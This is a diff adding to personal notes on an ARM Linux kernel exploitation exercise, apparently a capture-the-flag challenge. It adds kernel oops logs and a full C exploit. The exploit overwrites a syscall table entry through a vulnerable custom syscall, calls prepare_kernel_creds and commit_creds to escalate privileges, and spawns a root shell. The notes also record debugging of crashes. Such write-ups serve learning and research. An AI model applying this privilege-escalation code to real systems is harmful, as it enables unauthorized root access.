@@ -286,3 +286,102 @@ gcc -Wl,--section-start=.text=0x1030110 sol.c -o sol
 ```
 
 after redirecting code execution to my code I need to find resources on arm kernel exploitation, here are some links
+
+```
+Unable to handle kernel NULL pointer dereference at virtual address 000000e4
+pgd = 86954000
+[000000e4] *pgd=65e53831, *pte=00000000, *ppte=00000000
+Internal error: Oops: 17 [#1] SMP ARM
+Modules linked in: m(PO)
+CPU: 0 PID: 551 Comm: sol Tainted: P           O 3.11.4 #13
+task: 869203c0 ti: 8301a000 task.ti: 8301a000
+PC is at do_page_fault+0x40/0x360
+LR is at do_DataAbort+0x34/0x9c
+pc : [<8001991c>]    lr : [<80008440>]    psr: 00000193
+sp : 8301c020  ip : 804c6060  fp : 00000000
+r10: 00000000  r9 : 000000e4  r8 : 00000000
+r7 : 8301c150  r6 : 000000e4  r5 : 8301c000  r4 : 00000017
+r3 : 00000193  r2 : 00000028  r1 : 00000000  r0 : 000000e4
+Flags: nzcv  IRQs off  FIQs on  Mode SVC_32  ISA ARM  Segment user
+```
+
+```c
+#include <sys/syscall.h>
+#include <linux/kernel.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define EXPLOIT 222
+#define SYS_UPPER 223
+#define SYS_CALL_TABLE 0x8000e348
+
+long commit_creds = 0x8003f56c;
+long prepare_kernel_creds = 0x8003f924;
+
+SYSCALL_DEFINE2() {
+    // printk("[+] redirected syscall execution");
+    // volatile keyword idicates that the instuctions has important side-effects.
+    asm volatile (
+        "eor r0, r0\n"
+        "bl prepare_kernel_creds\n"
+        "bl commit_creds\n"
+    );
+    // printk("[+] privileges escaleted");   
+    return 0;  
+}
+
+int main(int argc, char *argv[]) {
+    unsigned int** syscall_table = (unsigned int**)SYS_CALL_TABLE;
+    char *entry_value = "\x89\x01\x03\x01";
+    int hook_address = 0;
+    // printf("[*] exploit location: %p\n", (void *)exploit);
+    
+    // overwrite an empty syscall
+    syscall(SYS_UPPER, entry_value, &syscall_table[EXPLOIT]);
+    syscall(SYS_UPPER, &syscall_table[EXPLOIT], (char *)&hook_address);
+    printf("[*] hook address: %p\n", (int *)hook_address);
+
+    // triger hook
+    // exploit();
+    syscall(EXPLOIT);
+
+    system("/bin/sh");
+    return 0;
+}
+
+/* 
+gcc -Wl,--section-start=.text=0x1030110 sol.c -o sol
+*/
+```
+
+removing the puts solved pagefaults... I cannot 
+```
+[*] hook address: 0x1030189
+Unable to handle kernel paging request at virtual address 01039034
+pgd = 85964000
+[01039034] *pgd=61bb7831, *pte=615d275f, *ppte=615d2c7f
+Internal error: Oops: 8000001f [#1] SMP ARM
+Modules linked in: m(PO)
+CPU: 0 PID: 557 Comm: sol Tainted: P           O 3.11.4 #13
+task: 868d72c0 ti: 83016000 task.ti: 83016000
+PC is at 0x1039034
+LR is at 0x1030195
+pc : [<01039034>]    lr : [<01030195>]    psr: 80000033
+sp : 83017fa4  ip : 10c53c7d  fp : 00000000
+r10: 00000000  r9 : 83016000  r8 : 8000e348
+r7 : 83017fa4  r6 : 01030189  r5 : 00000000  r4 : 00000001
+r3 : 7ea15e84  r2 : 00000001  r1 : 00000000  r0 : 00000000
+Flags: Nzcv  IRQs on  FIQs on  Mode SVC_32  ISA Thumb  Segment user
+Control: 10c53c7d  Table: 6596406a  DAC: 00000015
+Process sol (pid: 557, stack limit = 0x83016238)
+Stack: (0x83017fa4 to 0x83018000)
+7fa0:          000000de 00000001 00000000 00000001 00000000 00000001 7ea15e84
+7fc0: 00000001 00000000 01030189 000000de 00000000 00000000 76f56000 00000000
+7fe0: 7ea15d18 7ea15d08 0103020b 76ee18f0 60000010 00000001 d02b296c 9a052000
+Code: 0000 0000 f56c 8003 (f924) 8003 
+---[ end trace d70b3fabe7278f91 ]---
+```
+
+removed the `commit_creds` and I got the error `/bin/sh: can't access tty; job control turned off` so I `cat` the flag instead.
+the problem is that I fail to return from `commit_creds` or from `prepare_kernel_creds`.
